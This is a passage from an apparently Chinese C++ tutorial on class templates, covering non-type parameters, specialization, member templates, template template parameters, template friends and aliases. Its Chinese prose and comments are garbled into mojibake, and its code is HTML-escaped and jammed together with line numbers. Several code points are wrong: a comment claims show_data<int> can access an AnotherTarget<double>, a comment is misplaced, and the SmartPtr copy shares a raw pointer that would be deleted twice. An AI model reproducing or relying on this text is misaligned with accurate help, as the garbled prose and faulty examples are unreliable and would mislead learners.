&amp; ArrayTP&lt;T, n&gt;::operator[](int i) &#123; if (i &lt; 0 || i &gt;= n) &#123; std::cerr &lt;&lt; &quot;Error in array limits: &quot; &lt;&lt; i &lt;&lt; &quot; is out of range\\n&quot;; std::exit(EXIT_FAILURE); &#125; return ar[i];&#125;template &lt;typename T, int n&gt;T ArrayTP&lt;T, n&gt;::operator[](int i) const &#123; if (i &lt; 0 || i &gt;= n) &#123; std::cerr &lt;&lt; &quot;Error in array limits: &quot; &lt;&lt; i &lt;&lt; &quot; is out of range\\n&quot;; std::exit(EXIT_FAILURE); &#125; return ar[i];&#125;#endif // ARRAYTP_H_// ä½¿ç”¨ ArrayTP#include &quot;arraytp.h&quot; // åŒ…å«æ¨¡æ¿å®šä¹‰int main() &#123; // å®ä¾‹åŒ–ä¸€ä¸ªåŒ…å« 10 ä¸ª int çš„æ•°ç»„ ArrayTP&lt;int, 10&gt; sums; // å®ä¾‹åŒ–ä¸€ä¸ªåŒ…å« 10 ä¸ª double çš„æ•°ç»„ ArrayTP&lt;double, 10&gt; aves; // å®ä¾‹åŒ–ä¸€ä¸ªåŒ…å« 5 ä¸ªæŒ‡å‘ double çš„æŒ‡é’ˆçš„æ•°ç»„ ArrayTP&lt; ArrayTP&lt;int, 5&gt;, 10 &gt; twodee; // æ¨¡æ¿åµŒå¥—ï¼š10x5 çš„ int æ•°ç»„ int i, j; for (i = 0; i &lt; 10; i++) &#123; sums[i] = 0; for (j = 0; j &lt; 5; j++) &#123; twodee[i][j] = (i + 1) * (j + 1); sums[i] += twodee[i][j]; &#125; aves[i] = (double) sums[i] / 5; &#125; for (i = 0; i &lt; 10; i++) &#123; std::cout.width(2); std::cout &lt;&lt; i &lt;&lt; &quot;: &quot;; std::cout.width(3); std::cout &lt;&lt; sums[i] &lt;&lt; &quot; = average &quot; &lt;&lt; aves[i] &lt;&lt; std::endl; &#125; // ArrayTP&lt;double, 0&gt; zero_size; // é”™è¯¯æˆ–æ— æ„ä¹‰ï¼Œå–å†³äºç¼–è¯‘å™¨å’Œå®ç° return 0;&#125; ArrayTP&lt;int, 10&gt; å’Œ ArrayTP&lt;double, 10&gt; æ˜¯ä¸åŒçš„ç±»å‹ã€‚ ArrayTP&lt;int, 10&gt; å’Œ ArrayTP&lt;int, 12&gt; ä¹Ÿæ˜¯ä¸åŒçš„ç±»å‹ã€‚ éç±»å‹å‚æ•°å…è®¸æˆ‘ä»¬åœ¨ç¼–è¯‘æ—¶ç¡®å®šæ•°ç»„å¤§å°ç­‰å±æ€§ï¼Œè¿™æ¯”åŠ¨æ€åˆ†é…æ›´é«˜æ•ˆï¼Œå¹¶ä¸”å¯ä»¥è¿›è¡Œæ›´ä¸¥æ ¼çš„ç±»å‹æ£€æŸ¥ã€‚std::array å°±æ˜¯ä½¿ç”¨éç±»å‹å‚æ•°æ¥æŒ‡å®šå¤§å°çš„ã€‚ 14.4.5 æ¨¡æ¿å¤šåŠŸèƒ½æ€§ç±»æ¨¡æ¿å¯ä»¥ä¸ C++ çš„å…¶ä»–ç‰¹æ€§ç»“åˆä½¿ç”¨ï¼Œæä¾›å¼ºå¤§çš„åŠŸèƒ½ï¼š é€’å½’ä½¿ç”¨: æ¨¡æ¿å¯ä»¥é€’å½’åœ°ä½¿ç”¨è‡ªèº«ï¼Œå¦‚ ArrayTP&lt; ArrayTP&lt;int, 5&gt;, 10 &gt; åˆ›å»ºäºŒç»´æ•°ç»„ã€‚ æŒ‡é’ˆç±»å‹å‚æ•°: å¯ä»¥ç”¨æŒ‡é’ˆç±»å‹å®ä¾‹åŒ–æ¨¡æ¿ï¼Œä¾‹å¦‚ Stack&lt;int*&gt; åˆ›å»ºä¸€ä¸ªå­˜å‚¨ int æŒ‡é’ˆçš„æ ˆã€‚ åŒ…å«æ¨¡æ¿æˆå‘˜: ç±»æ¨¡æ¿å¯ä»¥åŒ…å«å…¶ä»–æ¨¡æ¿ç±»çš„å¯¹è±¡ä½œä¸ºæˆå‘˜ã€‚ ç»§æ‰¿: ç±»æ¨¡æ¿å¯ä»¥å‚ä¸ç»§æ‰¿ï¼Œå¯ä»¥ä»æ¨¡æ¿ç±»æ´¾ç”Ÿï¼Œä¹Ÿå¯ä»¥ä»æ™®é€šç±»æ´¾ç”Ÿï¼Œæˆ–è€…æ¨¡æ¿ç±»æœ¬èº«ä»å…¶ä»–ç±»æ´¾ç”Ÿã€‚ 14.4.6 æ¨¡æ¿çš„å…·ä½“åŒ–æœ‰æ—¶ï¼Œé€šç”¨çš„æ¨¡æ¿å®šä¹‰å¯¹äºæŸäº›ç‰¹å®šç±»å‹å¯èƒ½ä¸æ˜¯æœ€ä¼˜çš„ï¼Œæˆ–è€…æ ¹æœ¬æ— æ³•å·¥ä½œã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¸ºç‰¹å®šç±»å‹æä¾›ä¸€ä¸ªä¸“é—¨åŒ–çš„æ¨¡æ¿å®šä¹‰ï¼Œè¿™ç§°ä¸º**æ¨¡æ¿å…·ä½“åŒ– (Template Specialization)**ã€‚ æ˜¾å¼å…·ä½“åŒ– (Explicit Specialization): ä¸ºæŸä¸ªç‰¹å®šçš„ç±»å‹ï¼ˆæˆ–ä¸€ç»„ç‰¹å®šç±»å‹ï¼‰æä¾›ä¸€ä¸ªå®Œå…¨ä¸åŒçš„ç±»å®šä¹‰ã€‚ è¯­æ³•: 1234template &lt;&gt; // ç©ºçš„æ¨¡æ¿å‚æ•°åˆ—è¡¨class ClassName&lt;SpecificType&gt; &#123; // é’ˆå¯¹ SpecificType çš„ç‰¹æ®Šå®ç°&#125;; ç¤ºä¾‹: å‡è®¾æˆ‘ä»¬æƒ³ä¸º Stack&lt;const char*&gt; æä¾›ä¸€ä¸ªç‰¹æ®Šç‰ˆæœ¬ï¼Œå®ƒèƒ½æ­£ç¡®å¤„ç† C é£æ ¼å­—ç¬¦ä¸²çš„å¤åˆ¶ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;cstring&gt; // for strcpy, strlen// æ˜¾å¼å…·ä½“åŒ– Stack&lt;const char*&gt;template &lt;&gt;class Stack&lt;const char *&gt; &#123;private: enum &#123; MAX = 5 &#125;; // å‡è®¾å®¹é‡ä¸åŒ char * items[MAX]; // å­˜å‚¨æŒ‡å‘åŠ¨æ€åˆ†é…å­—ç¬¦ä¸²çš„æŒ‡é’ˆ int top;public: Stack(); ~Stack(); // éœ€è¦ææ„å‡½æ•°é‡Šæ”¾å†…å­˜ // ... isempty, isfull ... bool push(const char * const &amp; item); // æ³¨æ„å‚æ•°ç±»å‹ bool pop(const char * &amp; item); // æ³¨æ„å‚æ•°ç±»å‹ // éœ€è¦ç¦ç”¨æˆ–å®ç°å¤åˆ¶æ„é€ å’Œèµ‹å€¼ Stack(const Stack &amp;) = delete; Stack &amp; operator=(const Stack &amp;) = delete;&#125;;// å®ç° (éƒ¨åˆ†)Stack&lt;const char *&gt;::Stack() : top(0) &#123; for(int i=0; i&lt;MAX; ++i) items[i] = nullptr;&#125;Stack&lt;const char *&gt;::~Stack() &#123; for (int i = 0; i &lt; top; ++i) &#123; delete [] items[i]; // é‡Šæ”¾ push æ—¶åˆ†é…çš„å†…å­˜ &#125;&#125;bool Stack&lt;const char *&gt;::push(const char * const &amp; item) &#123; if (top &lt; MAX) &#123; items[top] = new char[std::strlen(item) + 1]; // åˆ†é…æ–°å†…å­˜ std::strcpy(items[top], item); // å¤åˆ¶å­—ç¬¦ä¸²å†…å®¹ top++; return true; &#125; else &#123; return false; &#125;&#125;bool Stack&lt;const char *&gt;::pop(const char * &amp; item) &#123; if (top &gt; 0) &#123; top--; item = items[top]; // è¿”å›æŒ‡é’ˆ (æ³¨æ„ï¼šè°ƒç”¨è€…ä¸åº” delete è¿™ä¸ªæŒ‡é’ˆ) // æˆ–è€…æ›´å¥½çš„åšæ³•æ˜¯å¤åˆ¶ä¸€ä»½è¿”å› // delete [] items[top]; // å¦‚æœ pop åä¸å†éœ€è¦ï¼Œåˆ™åˆ é™¤ // items[top] = nullptr; return true; &#125; else &#123; return false; &#125;&#125;// ... å…¶ä»–å®ç° ... å½“ç¼–è¯‘å™¨é‡åˆ° Stack&lt;const char *&gt; æ—¶ï¼Œå®ƒä¼šä½¿ç”¨è¿™ä¸ªæ˜¾å¼å…·ä½“åŒ–ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯é€šç”¨çš„ Stack&lt;T&gt; æ¨¡æ¿ã€‚ éƒ¨åˆ†å…·ä½“åŒ– (Partial Specialization): åªé™åˆ¶æ¨¡æ¿å‚æ•°çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯å…¨éƒ¨ã€‚ä¾‹å¦‚ï¼Œä¸ºæ‰€æœ‰æŒ‡é’ˆç±»å‹æä¾›ä¸€ä¸ªç‰¹æ®Šç‰ˆæœ¬ï¼Œæˆ–è€…ä¸ºä¸€ä¸ªæœ‰ä¸¤ä¸ªç±»å‹å‚æ•°çš„æ¨¡æ¿å›ºå®šå…¶ä¸­ä¸€ä¸ªå‚æ•°ã€‚ è¯­æ³• (ç¤ºä¾‹): 1234567891011// åŸå§‹æ¨¡æ¿template &lt;typename T1, typename T2&gt; class Pair &#123; /* ... */ &#125;;// éƒ¨åˆ†å…·ä½“åŒ–ï¼šT2 å›ºå®šä¸º inttemplate &lt;typename T1&gt; class Pair&lt;T1, int&gt; &#123; /* ... ç‰¹æ®Šå®ç° ... */ &#125;;// éƒ¨åˆ†å…·ä½“åŒ–ï¼šT1 å’Œ T2 éƒ½æ˜¯æŒ‡é’ˆç±»å‹template &lt;typename T1, typename T2&gt; class Pair&lt;T1*, T2*&gt; &#123; /* ... ç‰¹æ®Šå®ç° ... */ &#125;;// éƒ¨åˆ†å…·ä½“åŒ–ï¼šT1 å’Œ T2 æ˜¯ç›¸åŒç±»å‹template &lt;typename T&gt; class Pair&lt;T, T&gt; &#123; /* ... ç‰¹æ®Šå®ç° ... */ &#125;; ç¼–è¯‘å™¨ä¼šé€‰æ‹©æœ€åŒ¹é…çš„å…·ä½“åŒ–ç‰ˆæœ¬ã€‚å¦‚æœå¤šä¸ªéƒ¨åˆ†å…·ä½“åŒ–éƒ½èƒ½åŒ¹é…ï¼Œæˆ–è€…ä¸€ä¸ªéƒ¨åˆ†å…·ä½“åŒ–å’Œä¸€ä¸ªæ˜¾å¼å…·ä½“åŒ–éƒ½èƒ½åŒ¹é…ï¼Œç¼–è¯‘å™¨ä¼šé€‰æ‹©â€œæ›´å…·ä½“â€çš„é‚£ä¸ªã€‚ 14.4.7 æˆå‘˜æ¨¡æ¿ç±»ï¼ˆæ— è®ºæ˜¯æ™®é€šç±»è¿˜æ˜¯æ¨¡æ¿ç±»ï¼‰å¯ä»¥åŒ…å«æœ¬èº«æ˜¯æ¨¡æ¿çš„æˆå‘˜å‡½æ•°æˆ–æˆå‘˜ç±»ã€‚è¿™ç§°ä¸º**æˆå‘˜æ¨¡æ¿ (Member Templates)**ã€‚ ç¤ºä¾‹ï¼šæ¨¡æ¿æ„é€ å‡½æ•°å’Œæ¨¡æ¿èµ‹å€¼è¿ç®—ç¬¦ æ™ºèƒ½æŒ‡é’ˆç±»ï¼ˆå¦‚ unique_ptr, shared_ptrï¼‰ç»å¸¸ä½¿ç”¨æ¨¡æ¿æ„é€ å‡½æ•°å’Œæ¨¡æ¿èµ‹å€¼è¿ç®—ç¬¦ï¼Œä»¥å…è®¸ä»æŒ‡å‘æ´¾ç”Ÿç±»çš„æ™ºèƒ½æŒ‡é’ˆæ„é€ æˆ–èµ‹å€¼ç»™æŒ‡å‘åŸºç±»çš„æ™ºèƒ½æŒ‡é’ˆã€‚ 12345678910111213141516171819202122232425262728293031323334template&lt;typename T&gt;class SmartPtr &#123;private: T* ptr;public: explicit SmartPtr(T* p = nullptr) : ptr(p) &#123;&#125; ~SmartPtr() &#123; delete ptr; &#125; // æ¨¡æ¿æˆå‘˜ï¼šæ¨¡æ¿å¤åˆ¶æ„é€ å‡½æ•° template&lt;typename U&gt; SmartPtr(const SmartPtr&lt;U&gt;&amp; other) &#123; // å…è®¸ä» SmartPtr&lt;U&gt; æ„é€  SmartPtr&lt;T&gt; // é€šå¸¸éœ€è¦ U* èƒ½å¤Ÿéšå¼è½¬æ¢ä¸º T* (ä¾‹å¦‚ U æ˜¯ T çš„æ´¾ç”Ÿç±») ptr = other.get(); // ç®€åŒ–ç¤ºä¾‹ï¼Œå®é™…æ™ºèƒ½æŒ‡é’ˆå¤åˆ¶æ›´å¤æ‚ // ... å¯èƒ½éœ€è¦å¢åŠ å¼•ç”¨è®¡æ•°ç­‰ ... &#125; // æ¨¡æ¿æˆå‘˜ï¼šæ¨¡æ¿èµ‹å€¼è¿ç®—ç¬¦ template&lt;typename U&gt; SmartPtr&amp; operator=(const SmartPtr&lt;U&gt;&amp; other) &#123; // ... ç±»ä¼¼é€»è¾‘ ... return *this; &#125; T* get() const &#123; return ptr; &#125; // ... å…¶ä»–æˆå‘˜ ...&#125;;// ä½¿ç”¨class Base &#123;&#125;;class Derived : public Base &#123;&#125;;SmartPtr&lt;Derived&gt; pDerived(new Derived);SmartPtr&lt;Base&gt; pBase = pDerived; // OK: è°ƒç”¨æ¨¡æ¿å¤åˆ¶æ„é€ å‡½æ•° SmartPtr&lt;Base&gt;(const SmartPtr&lt;Derived&gt;&amp;) æˆå‘˜æ¨¡æ¿å¢åŠ äº†ç±»çš„çµæ´»æ€§ï¼Œå…è®¸æˆå‘˜å‡½æ•°æˆ–åµŒå¥—ç±»å¤„ç†æ›´å¹¿æ³›çš„ç±»å‹ã€‚ 14.4.8 å°†æ¨¡æ¿ç”¨ä½œå‚æ•°æ¨¡æ¿æœ¬èº«ä¹Ÿå¯ä»¥ä½œä¸ºæ¨¡æ¿çš„å‚æ•°ï¼Œè¿™ç§°ä¸º**æ¨¡æ¿æ¨¡æ¿å‚æ•° (Template Template Parameters)**ã€‚ è¯­æ³•: 123456template &lt;typename T, template &lt;typename U&gt; class Container&gt; // Container æ˜¯ä¸€ä¸ªæ¨¡æ¿æ¨¡æ¿å‚æ•°class Manager &#123;private: Container&lt;T&gt; items; // ä½¿ç”¨æ¨¡æ¿å‚æ•° Container æ¥å®ä¾‹åŒ– // ...&#125;; template &lt;typename U&gt; class Container: å£°æ˜ Container æ˜¯ä¸€ä¸ªæ¥å—ä¸€ä¸ªç±»å‹å‚æ•°çš„ç±»æ¨¡æ¿ã€‚ åœ¨ Manager å†…éƒ¨ï¼Œå¯ä»¥ç”¨å…·ä½“çš„ç±»å‹ T æ¥å®ä¾‹åŒ– Containerï¼Œå¦‚ Container&lt;T&gt;ã€‚ ç¤ºä¾‹: åˆ›å»ºä¸€ä¸ªå¯ä»¥ä½¿ç”¨ä¸åŒå®¹å™¨ï¼ˆå¦‚ std::vector, std::list, æˆ–æˆ‘ä»¬è‡ªå·±çš„ Stackï¼‰æ¥å­˜å‚¨å…ƒç´ çš„ Managerã€‚ 123456789101112131415161718192021222324252627282930313233#include &lt;vector&gt;#include &lt;list&gt;#include &quot;stacktp.h&quot; // å‡è®¾ Stack&lt;T&gt; åœ¨è¿™é‡Œtemplate &lt;typename T, template &lt;typename Elem&gt; class Container&gt; // Container æ¥å—ä¸€ä¸ªç±»å‹å‚æ•° Elemclass Manager &#123;private: Container&lt;T&gt; items; // ä½¿ç”¨ Container&lt;T&gt; æ¥å­˜å‚¨ T ç±»å‹çš„å…ƒç´ public: void add(const T&amp; item) &#123; // å‡è®¾ Container æœ‰ push_back æˆ– push æ–¹æ³• // items.push_back(item); // å¦‚æœæ˜¯ vector/list // items.push(item); // å¦‚æœæ˜¯ Stack // éœ€è¦æ›´é€šç”¨çš„æ–¹å¼æˆ–å¯¹ Container æœ‰è¦æ±‚ &#125; // ...&#125;;int main() &#123; // ä½¿ç”¨ std::vector ä½œä¸ºå®¹å™¨ Manager&lt;int, std::vector&gt; vectorManager; // vectorManager.add(10); // ä½¿ç”¨ std::list ä½œä¸ºå®¹å™¨ Manager&lt;double, std::list&gt; listManager; // listManager.add(3.14); // ä½¿ç”¨æˆ‘ä»¬è‡ªå·±çš„ Stack ä½œä¸ºå®¹å™¨ Manager&lt;std::string, Stack&gt; stackManager; // stackManager.add(&quot;hello&quot;); return 0;&#125; æ¨¡æ¿æ¨¡æ¿å‚æ•°ä½¿å¾—ä»£ç æ›´åŠ é€šç”¨ï¼Œå¯ä»¥é€‚é…ä¸åŒçš„æ¨¡æ¿ç»“æ„ã€‚ 14.4.9 æ¨¡æ¿ç±»å’Œå‹å…ƒå‹å…ƒå…³ç³»å¯ä»¥ä¸ç±»æ¨¡æ¿ç»“åˆï¼Œæœ‰å‡ ç§ä¸åŒçš„å½¢å¼ï¼š éæ¨¡æ¿å‹å…ƒå‡½æ•°/ç±»: ä¸€ä¸ªæ™®é€šçš„ï¼ˆéæ¨¡æ¿ï¼‰å‡½æ•°æˆ–ç±»å¯ä»¥æ˜¯æ¨¡æ¿ç±»çš„å‹å…ƒã€‚è¿™æ„å‘³ç€è¿™ä¸ªå‡½æ•°/ç±»å¯ä»¥è®¿é—®æ‰€æœ‰è¯¥æ¨¡æ¿ç±»å®ä¾‹åŒ–çš„ç§æœ‰æˆå‘˜ã€‚ 123456789101112131415template &lt;typename T&gt;class HasFriend &#123; friend void report(const HasFriend&lt;T&gt; &amp;); // éæ¨¡æ¿å‡½æ•° report æ˜¯æ‰€æœ‰å®ä¾‹çš„å‹å…ƒprivate: T item;public: HasFriend(const T &amp; i) : item(i) &#123;&#125;&#125;;// report å‡½æ•°éœ€è¦ä¸ºæ¯ä¸ªå®ä¾‹å•ç‹¬å®šä¹‰æˆ–ä½¿ç”¨æ¨¡æ¿// void report(const HasFriend&lt;int&gt; &amp; hf) &#123; std::cout &lt;&lt; hf.item; &#125; // é’ˆå¯¹ int å®ä¾‹// void report(const HasFriend&lt;double&gt; &amp; hf) &#123; std::cout &lt;&lt; hf.item; &#125; // é’ˆå¯¹ double å®ä¾‹// æˆ–è€…å°† report ä¹Ÿå®šä¹‰ä¸ºæ¨¡æ¿å‡½æ•°template &lt;typename T&gt;void report(const HasFriend&lt;T&gt; &amp; hf) &#123; std::cout &lt;&lt; hf.item; &#125; // æ¨¡æ¿å‹å…ƒå‡½æ•° çº¦æŸæ¨¡æ¿å‹å…ƒå‡½æ•°/ç±» (Bound Template Friend): æ¨¡æ¿å‡½æ•°/ç±»çš„ç‰¹å®šå®ä¾‹åŒ–æ˜¯æ¨¡æ¿ç±»çš„ç‰¹å®šå®ä¾‹åŒ–çš„å‹å…ƒã€‚å³ Friend&lt;T&gt; æ˜¯ Target&lt;T&gt; çš„å‹å…ƒã€‚ 12345678910111213141516// å‰å‘å£°æ˜template &lt;typename T&gt; class Target;template &lt;typename T&gt; void friend_func(const Target&lt;T&gt; &amp;);template &lt;typename T&gt;class Target &#123; // friend_func&lt;T&gt; æ˜¯ Target&lt;T&gt; çš„å‹å…ƒ friend void friend_func&lt;T&gt;(const Target&lt;T&gt; &amp;);private: T data;&#125;;template &lt;typename T&gt;void friend_func(const Target&lt;T&gt; &amp; t) &#123; std::cout &lt;&lt; t.data; // å¯ä»¥è®¿é—® Target&lt;T&gt; çš„ç§æœ‰æˆå‘˜&#125; è¿™é‡Œï¼Œfriend_func&lt;int&gt; æ˜¯ Target&lt;int&gt; çš„å‹å…ƒï¼Œfriend_func&lt;double&gt; æ˜¯ Target&lt;double&gt; çš„å‹å…ƒï¼Œä½† friend_func&lt;int&gt; ä¸æ˜¯ Target&lt;double&gt; çš„å‹å…ƒã€‚ éçº¦æŸæ¨¡æ¿å‹å…ƒå‡½æ•°/ç±» (Unbound Template Friend): æ¨¡æ¿å‡½æ•°/ç±»çš„æ‰€æœ‰å®ä¾‹åŒ–éƒ½æ˜¯æ¨¡æ¿ç±»çš„æ‰€æœ‰å®ä¾‹åŒ–çš„å‹å…ƒã€‚å³ä»»ä½• Friend&lt;U&gt; éƒ½æ˜¯ä»»ä½• Target&lt;T&gt; çš„å‹å…ƒã€‚ 1234567891011121314151617181920template &lt;typename T&gt;class AnotherTarget &#123; // å£°æ˜æ¨¡æ¿å‡½æ•° show_data ä¸ºå‹å…ƒ template &lt;typename U&gt; // æ¨¡æ¿å‚æ•° U å¯ä»¥ä¸ T ä¸åŒ friend void show_data(const AnotherTarget&lt;U&gt; &amp;);private: T data;&#125;;template &lt;typename U&gt;void show_data(const AnotherTarget&lt;U&gt; &amp; at) &#123; std::cout &lt;&lt; at.data; // å¯ä»¥è®¿é—®ä»»ä½• AnotherTarget&lt;U&gt; å®ä¾‹çš„ç§æœ‰æˆå‘˜&#125;// ä½¿ç”¨AnotherTarget&lt;int&gt; ati(10);AnotherTarget&lt;double&gt; atd(3.14);// show_data&lt;int&gt;(ati); // OK// show_data&lt;double&gt;(atd); // OK// show_data&lt;int&gt;(atd); // ä¹Ÿèƒ½è®¿é—® atd.dataï¼Œå› ä¸º show_data&lt;int&gt; æ˜¯æ‰€æœ‰ AnotherTarget çš„å‹å…ƒ éçº¦æŸå‹å…ƒæä¾›äº†æœ€å¤§çš„è®¿é—®æƒé™ï¼Œä½†ä¹Ÿå¯èƒ½ç ´åå°è£…ï¼Œéœ€è¦è°¨æ…ä½¿ç”¨ã€‚ 14.4.10 æ¨¡æ¿åˆ«åï¼ˆC++11ï¼‰C++11 å¼•å…¥äº† using å…³é”®å­—ï¼ˆä¹‹å‰ä¸»è¦ç”¨äº using å£°æ˜å’Œ using æŒ‡ä»¤ï¼‰æ¥åˆ›å»º**æ¨¡æ¿åˆ«å (Template Aliases)**ï¼Œä½¿å¾—ä½¿ç”¨å¤æ‚çš„æ¨¡æ¿ç±»å‹æ›´åŠ æ–¹ä¾¿ã€‚ è¯­æ³•: 123456// ä¸ºç‰¹å®šå®ä¾‹åŒ–åˆ›å»ºåˆ«åusing AliasName = ExistingTemplate&lt;ConcreteType&gt;;// ä¸ºæ¨¡æ¿æœ¬èº«åˆ›å»ºåˆ«å (å‚æ•°åŒ–çš„åˆ«å)template &lt;typename T&gt;using AliasTemplateName = ExistingTemplate&lt;T, SomeFixedType, ...&gt;; ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930#include &lt;vector&gt;#include &lt;string&gt;#include &lt;array&gt;// ä¸ºç‰¹å®šå®ä¾‹åŒ–åˆ›å»ºåˆ«åusing IntVec = std::vector&lt;int&gt;;using StringArray10 = std::array&lt;std::string, 10&gt;;// ä¸ºæ¨¡æ¿åˆ›å»ºåˆ«åtemplate&lt;typename T&gt;using Vec = std::vector&lt;T&gt;; // Vec&lt;T&gt; ç­‰ä»·äº std::vector&lt;T&gt;template&lt;typename T&gt;using Array12 = std::array&lt;T, 12&gt;; // Array12&lt;T&gt; ç­‰ä»·äº std::array&lt;T, 12&gt;int main() &#123; IntVec numbers; // numbers æ˜¯ std::vector&lt;int&gt; numbers.push_back(1); StringArray10 names; // names æ˜¯ std::array&lt;std::string, 10&gt; names[0] = &quot;Alice&quot;; Vec&lt;double&gt; doubles; // doubles æ˜¯ std::vector&lt;double&gt; doubles.push_back(3.14); Array12&lt;char&gt; chars; // chars æ˜¯ std::array&lt;char, 12&gt; chars[0] = &#x27;a&#x27;; return 0;&#125; æ¨¡æ¿åˆ«åæ¯”ä¼ ç»Ÿçš„ typedef æ›´å¼ºå¤§ï¼Œå› ä¸º typedef ä¸èƒ½ç›´æ¥ä¸ºæ¨¡æ¿åˆ›å»ºåˆ«åï¼ˆåªèƒ½ä¸ºå®Œå…¨å®ä¾‹åŒ–çš„ç±»å‹åˆ›å»ºåˆ«åï¼‰ã€‚æ¨¡æ¿åˆ«åæé«˜äº†ä»£ç çš„å¯è¯»æ€§å’Œæ˜“ç”¨æ€§ã€‚ 14.5 æ€»ç»“æœ¬ç« æ¢è®¨äº† C++ ä¸­é™¤äº†å…¬æœ‰ç»§æ‰¿ä¹‹å¤–çš„å…¶ä»–ä»£ç é‡ç”¨æŠ€æœ¯ï¼ŒåŒ…æ‹¬åŒ…å«ï¼ˆç»„åˆï¼‰ã€ç§æœ‰ç»§æ‰¿ã€ä¿æŠ¤ç»§æ‰¿ã€å¤šé‡ç»§æ‰¿ä»¥åŠå¼ºå¤§çš„ç±»æ¨¡æ¿ã€‚è¿™äº›æŠ€æœ¯æä¾›äº†ä¸åŒçš„æ–¹å¼æ¥å»ºç«‹ç±»ä¹‹é—´çš„å…³ç³»å’Œåˆ›å»ºå¯é‡ç”¨çš„é€šç”¨ä»£ç ã€‚ ä¸»è¦å†…å®¹å›é¡¾ï¼š åŒ…å«/ç»„åˆ (Composition): é€šè¿‡å°†ä¸€ä¸ªç±»çš„å¯¹è±¡ä½œä¸ºå¦ä¸€ä¸ªç±»çš„æˆå‘˜æ¥å®ç°ï¼Œæ¨¡æ‹Ÿ â€œhas-aâ€ å…³ç³»ã€‚ æ˜¯ä»£ç é‡ç”¨çš„å¸¸ç”¨ä¸”æ¨èçš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯å½“æˆå‘˜å¯¹è±¡èƒ½è‡ªæˆ‘ç®¡ç†èµ„æºæ—¶ï¼ˆéµå¾ªé›¶æ³•åˆ™ï¼‰ã€‚ åŒ…å«ç±»çš„æ„é€ å‡½æ•°ä½¿ç”¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨æ¥åˆå§‹åŒ–æˆå‘˜å¯¹è±¡ã€‚ ä¾‹å¦‚ï¼ŒStudent ç±»åŒ…å« std::string å’Œ std::valarray&lt;double&gt; æˆå‘˜ã€‚ ç§æœ‰ç»§æ‰¿ (private): æ¨¡æ‹Ÿ â€œis-implemented-in-terms-ofâ€ å…³ç³»ï¼Œç»§æ‰¿å®ç°ä½†ä¸ç»§æ‰¿æ¥å£ã€‚ åŸºç±»çš„å…¬æœ‰å’Œä¿æŠ¤æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸ºç§æœ‰ã€‚ é€šå¸¸ä¸å¦‚åŒ…å«ç›´è§‚å’Œçµæ´»ï¼Œä½†å¯ç”¨äºè®¿é—®åŸºç±»çš„ä¿æŠ¤æˆå‘˜æˆ–è¦†ç›–è™šå‡½æ•°ï¼ˆè™½ç„¶è®¿é—®æƒé™å˜ä¸ºç§æœ‰ï¼‰ã€‚ æ´¾ç”Ÿç±»éœ€è¦æä¾›è‡ªå·±çš„æ¥å£æ¥æš´éœ²æ‰€éœ€åŠŸèƒ½ï¼Œå†…éƒ¨è®¿é—®åŸºç±»æˆå‘˜é€šå¸¸éœ€è¦ç±»å‹è½¬æ¢ã€‚ ä¿æŠ¤ç»§æ‰¿ (protected): åŸºç±»çš„å…¬æœ‰å’Œä¿æŠ¤æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸ºä¿æŠ¤ã€‚ ä¸ç§æœ‰ç»§æ‰¿ç±»ä¼¼ï¼Œç»§æ‰¿å®ç°ä½†ä¸ç»§æ‰¿æ¥å£ã€‚ å…è®¸åç»­çš„æ´¾ç”Ÿç±»è®¿é—®ç»§æ‰¿æ¥çš„ï¼ˆç°åœ¨æ˜¯ä¿æŠ¤çš„ï¼‰æˆå‘˜ã€‚ ä½¿ç”¨åœºæ™¯éå¸¸æœ‰é™ã€‚ åŒ…å« vs. ç§æœ‰ç»§æ‰¿: å¯¹äº â€œhas-aâ€ å…³ç³»ï¼Œ**ä¼˜å…ˆé€‰æ‹©åŒ…å« (ç»„åˆ)**ï¼Œå› ä¸ºå®ƒæ›´ç®€å•ã€æ¸…æ™°ã€çµæ´»ã€‚ using å£°æ˜ä¸ç»§æ‰¿: åœ¨ç§æœ‰æˆ–ä¿æŠ¤ç»§æ‰¿ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ using Base::member; åœ¨æ´¾ç”Ÿç±»ä¸­æ¢å¤åŸºç±»æŸä¸ªæˆå‘˜çš„å¯è®¿é—®æ€§ï¼ˆé€šå¸¸æå‡åˆ° public æˆ– protectedï¼‰ã€‚ å¤šé‡ç»§æ‰¿ (MI): å…è®¸ä¸€ä¸ªç±»ä»å¤šä¸ªåŸºç±»ç»§æ‰¿ã€‚ å¯èƒ½å¯¼è‡´æ­§ä¹‰ï¼ˆæˆå‘˜åå†²çªï¼‰å’Œé’»çŸ³é—®é¢˜ï¼ˆå…±åŒåŸºç±»çš„å¤šå‰¯æœ¬ï¼‰ã€‚ åç§°å†²çªé€šè¿‡ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ (::) è§£å†³ã€‚ é’»çŸ³é—®é¢˜é€šè¿‡è™šåŸºç±» (virtual public Base) è§£å†³ï¼Œç¡®ä¿å…±äº«åŸºç±»çš„å•ä¸€å‰¯æœ¬ï¼Œä½†æ„é€ å‡½æ•°å®ç°æ›´å¤æ‚ã€‚ åº”è°¨æ…ä½¿ç”¨ï¼Œä¼˜å…ˆè€ƒè™‘ç»„åˆæˆ–å•ç»§æ‰¿ã€‚ ç±»æ¨¡æ¿: å…è®¸åˆ›å»ºå‚æ•°åŒ–çš„ç±»è“å›¾ï¼Œç”¨äºç”Ÿæˆå¤„ç†ä¸åŒç±»å‹çš„ç±»ã€‚ ä½¿ç”¨ template &lt;typename T, ...&gt; å®šä¹‰ã€‚ é€šè¿‡æä¾›å…·ä½“ç±»å‹æ¥å®ä¾‹åŒ–æ¨¡æ¿ç±»ï¼Œå¦‚ Stack&lt;int&gt;ã€‚ æ¨¡æ¿å®ç°é€šå¸¸æ”¾åœ¨å¤´æ–‡ä»¶ä¸­ã€‚ å¯ä»¥æœ‰éç±»å‹å‚æ•°ï¼ˆå¦‚ template &lt;typename T, int 